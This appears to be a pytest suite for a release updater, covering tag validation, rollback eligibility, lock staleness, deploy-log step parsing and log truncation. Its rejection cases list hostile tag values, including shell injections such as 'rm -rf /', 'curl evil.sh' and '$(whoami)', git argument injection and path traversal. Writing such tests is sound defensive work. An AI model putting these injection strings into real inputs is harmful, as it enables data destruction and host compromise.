"""The updater's decisions, tested without Docker.

Everything here is a pure function on purpose. The alternative — a bash
supervisor calling `python3 -c` for JSON — would put tag validation, the
security-critical part, outside any test the suite can run.
"""
import pytest

from updater.supervisor import (
    MIN_ROLLBACK_TAG,
    clamp_log_tail,
    eligible_rollback_targets,
    is_stale_lock,
    parse_deployed_tags,
    step_for_line,
    validate_tag,
)


# ── Tag validation ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("tag", ["v1.0.0", "v0.0.1", "v10.20.30", "v1.2.3", "v0.0.0", "v0.9.9"])
def test_valid_tags_accepted(tag):
    assert validate_tag(tag) is True


@pytest.mark.parametrize("tag", [
    "--upload-pack=/bin/sh",     # git argument injection
    "v1.2.3; rm -rf /",          # shell metacharacters
    "v1.2.3 && curl evil.sh",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",          # path traversal
    "../v1.0.0",
    "v1.2.3-rc1",                # prereleases are deliberately not deployable
    "V1.2.3",                    # wrong case
    "1.2.3",                     # missing the v
    "v1.2",                      # not three components
    "v1.2.3.4",
    "latest",
    "",
    "   ",
    None,
    "v01.0.0",                   # leading zero: same distinct-ref/same-tuple
    "v1.00.0",                   # collision class as the homoglyph case
    "v1.0.00",
])
def test_hostile_and_malformed_tags_rejected(tag):
    assert validate_tag(tag) is False


def test_validation_rejects_embedded_newline():
    """A newline would let a second line reach a log or a file write intact."""
    assert validate_tag("v1.0.0\nv2.0.0") is False


def test_validation_rejects_a_trailing_newline():
    """Python's `$` also matches just before a trailing newline, so a regex
    anchored with `$` accepts "v1.0.0\n". The anchor must be `\\Z`."""
    assert validate_tag("v1.0.0\n") is False


def test_validation_rejects_unicode_digits():
    """`\\d` is Unicode-aware in Python, so it accepts Arabic-Indic digits.
    "v١.٠.٠" is a DIFFERENT git ref that parse_version() reads as the same
    (1, 0, 0) tuple as "v1.0.0" — a homoglyph collision in the one function
    whose job is to pin an exact release."""
    assert validate_tag("v١.٠.٠") is False


@pytest.mark.parametrize("tag", [b"v1.0.0", 1.0, 100, ["v1.0.0"], {"tag": "v1.0.0"}, True])
def test_non_string_tags_rejected_without_raising(tag):
    """The tag arrives from JSON written by another process, so a non-str is a
    real possibility. re.match would raise TypeError rather than return False."""
    assert validate_tag(tag) is False


# ── .deployed parsing and rollback eligibility ───────────────────────────────

def test_parse_deployed_extracts_tags_in_order():
    text = (
        "2026-07-26T18:54:28Z v1.0.0\n"
        "2026-07-27T09:00:00Z v1.1.0\n"
        "2026-07-27T10:00:00Z v1.0.0\n"
    )
    assert parse_deployed_tags(text) == ["v1.0.0", "v1.1.0", "v1.0.0"]


def test_parse_deployed_ignores_junk_lines():
    assert parse_deployed_tags("\ngarbage\n2026-07-26T18:54:28Z v1.0.0\n") == ["v1.0.0"]


def test_eligible_targets_excludes_the_running_tag():
    lines = "t v1.1.0\nt v1.2.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.2.0") == ["v1.1.0"]


def test_eligible_targets_refuses_below_the_updater_floor():
    """Rolling back past the release that introduced the updater checks out a
    compose file with no /control mount, so the app returns unable to submit
    OR read requests. That is a one-way door back to SSH, not a degraded mode."""
    lines = "t v1.0.0\nt v1.1.0\nt v1.2.0\n"
    targets = eligible_rollback_targets(lines, current_tag="v1.2.0")
    assert "v1.0.0" not in targets
    assert targets == ["v1.1.0"]


def test_min_rollback_tag_is_itself_eligible():
    lines = f"t {MIN_ROLLBACK_TAG}\nt v9.9.9\n"
    assert MIN_ROLLBACK_TAG in eligible_rollback_targets(lines, current_tag="v9.9.9")


def test_eligible_targets_are_deduped_and_version_ordered_newest_first():
    lines = "t v1.1.0\nt v1.10.0\nt v1.2.0\nt v1.1.0\nt v2.0.0\n"
    assert eligible_rollback_targets(lines, current_tag="v2.0.0") == [
        "v1.10.0", "v1.2.0", "v1.1.0",
    ]


def test_eligible_targets_drops_malformed_entries():
    lines = "t v1.1.0\nt not-a-tag\nt v1.2.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.2.0") == ["v1.1.0"]


def test_eligible_targets_empty_when_only_one_release_recorded():
    """The live host is in exactly this state: .deployed holds one line."""
    assert eligible_rollback_targets("t v1.0.0\n", current_tag="v1.0.0") == []


def test_eligible_targets_excludes_releases_newer_than_the_running_one():
    """A control labelled "Roll back" must not offer to move forward. Going
    forward is what the tag field is for, and rollback.sh's own bare mode
    already means "the newest release strictly older than the running one"."""
    lines = "t v1.1.0\nt v1.2.0\nt v1.3.0\nt v1.2.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.2.0") == ["v1.1.0"]


def test_eligible_targets_empty_when_running_the_oldest_recorded_release():
    lines = "t v1.1.0\nt v1.2.0\nt v1.1.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.1.0") == []


def test_eligible_targets_fail_closed_on_an_unparseable_current_tag():
    """Skipping the at-or-newer guard would offer releases NEWER than the
    running one. This function is also the pickup-time re-validation, so
    failing open here would let a mislabelled "roll back" actually execute."""
    lines = "t v1.1.0\nt v9.9.9\n"
    assert eligible_rollback_targets(lines, current_tag="garbage") == []
    assert eligible_rollback_targets(lines, current_tag=None) == []
    assert eligible_rollback_targets(lines, current_tag="dev") == []


def test_eligible_targets_reject_what_parse_version_would_accept():
    """parse_version is the LAXER regex — it happily parses "v1.3.0-rc1" and
    "v١.٠.٠". validate_tag must therefore run FIRST. A prerelease in .deployed
    is normal operation, not hypothetical: deploy.sh --tag v1.3.0-rc1 is the
    documented escape hatch and [3/5] records whatever it deployed."""
    lines = "t v1.1.0\nt v1.3.0-rc1\nt v١.٠.٠\nt v1.4.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.4.0") == ["v1.1.0"]


# ── Lock staleness ───────────────────────────────────────────────────────────

def test_lock_held_by_a_live_recent_process_is_not_stale():
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1060.0, pid_alive=lambda p: True) is False


def test_lock_with_a_dead_pid_is_stale():
    """Without this a killed updater wedges the feature permanently, and the
    only recovery is the SSH session this whole feature exists to avoid."""
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1060.0, pid_alive=lambda p: False) is True


def test_lock_older_than_thirty_minutes_is_stale_even_if_the_pid_lives():
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1000.0 + 1801, pid_alive=lambda p: True) is True


def test_unparseable_lock_is_stale():
    assert is_stale_lock({}, now=1.0, pid_alive=lambda p: True) is True
    assert is_stale_lock(None, now=1.0, pid_alive=lambda p: True) is True


@pytest.mark.parametrize("pid", [True, False, 0, -1, "123", None, 1.5])
def test_lock_with_an_out_of_range_or_wrong_type_pid_is_stale(pid):
    """isinstance(True, int) is True since bool subclasses int, so a bare type
    check alone would accept True/False as pids. pid=0 signals the entire
    process group via os.kill and pid=-1 signals every process the caller's
    uid can reach — both would report "alive" via a real side effect rather
    than a lookup, so treating them as valid pids is unsafe even before
    considering whether the callback is well-behaved."""
    lock = {"pid": pid, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1010.0, pid_alive=lambda p: True) is True


# ── deploy.sh output → step ──────────────────────────────────────────────────

@pytest.mark.parametrize("line,step", [
    ("[0/5] preflight: external 'web' network + compose declaration", "preflight"),
    ("[1/5] Deploy v1.1.0 (checkout + pull + recreate)", "deploying"),
    ("[2/5] Health check", "awaiting-health"),
    ("→ Automatically reverting to v1.0.0", "reverting"),
    ("[3/5] Record the deploy", "finalizing"),
    ("[4/5] Startup log scan", "finalizing"),
    ("[5/5] Done", "finalizing"),
    ("[1/4] Roll back to v1.0.0", "deploying"),
    ("[4/4] Health check", "awaiting-health"),
])
def test_step_markers_recognised(line, step):
    assert step_for_line(line) == step


def test_unrecognised_output_does_not_change_the_step():
    assert step_for_line("     resolved latest release: v1.1.0") is None


def test_app_log_output_cannot_walk_progress_backwards():
    """[4/5] echoes raw `docker logs` into the same stream, so an application
    log line mentioning a marker must not be mistaken for one. Real markers are
    always at column 0."""
    assert step_for_line("2026-07-26 INFO worker [1/5] starting batch") is None
    assert step_for_line("  WARNING: Automatically reverting cache entry") is None
    assert step_for_line("[1/5] Deploy v1.1.0 (checkout + pull + recreate)") == "deploying"


# ── Log clamping ─────────────────────────────────────────────────────────────

def test_log_tail_capped_at_one_hundred_lines():
    assert len(clamp_log_tail([f"line {i}" for i in range(500)])) == 100


def test_log_tail_keeps_the_most_recent_lines():
    out = clamp_log_tail([f"line {i}" for i in range(500)])
    assert out[-1] == "line 499"


def test_log_tail_capped_at_eight_kilobytes():
    """A chatty failure must not be able to fill the control volume."""
    out = clamp_log_tail(["x" * 1000] * 100)
    assert sum(len(l.encode()) for l in out) <= 8192


def test_log_tail_never_empties_on_a_single_oversized_line():
    """A docker pull dump or a traceback arrives as ONE long line. Popping
    until it fits would leave the operator staring at nothing on the exact
    path where the log is all they have."""
    out = clamp_log_tail(["x" * 100_000])
    assert len(out) == 1
    assert sum(len(l.encode()) for l in out) <= 8192
    assert out[0].startswith("...")


def test_log_tail_truncation_keeps_the_end_not_the_beginning():
    """A traceback's exception line and a progress dump's final state are both
    at the END. Keeping the head threw away the only line that says what went
    wrong, on the exact path where the log tail is all the operator has."""
    tb = ("Traceback (most recent call last):\n"
          + '  File "x.py", line 1, in f\n' * 4000
          + "ValueError: THE ACTUAL ERROR MESSAGE\n")
    out = clamp_log_tail([tb])
    assert "ValueError: THE ACTUAL ERROR MESSAGE" in out[0]
    assert out[0].startswith("...")
    assert len(out[0].encode()) <= 8192


def test_log_tail_of_empty_input_is_empty():
    assert clamp_log_tail([]) == []


def test_log_tail_cap_counts_bytes_not_characters():
    """deploy.sh emits 3-byte UTF-8 (→ ✓ ✗ ⚠) on the auto-revert path, so a
    character-counted cap silently allowed 2x the intended size — 4x for emoji.
    The constant is named _BYTES and justified by disk space on a shared volume."""
    for filler in ("é", "🚀"):
        out = clamp_log_tail([filler * 9000])
        assert sum(len(l.encode()) for l in out) <= 8192, filler


def test_log_tail_truncation_never_splits_a_codepoint():
    """A byte slice landing mid-codepoint would produce invalid UTF-8, which the
    app's json.load would reject — turning a readable failure into no status
    at all."""
    out = clamp_log_tail(["🚀" * 9000])
    assert len(out) == 1
    out[0].encode("utf-8")            # must not raise
    assert out[0].startswith("...")
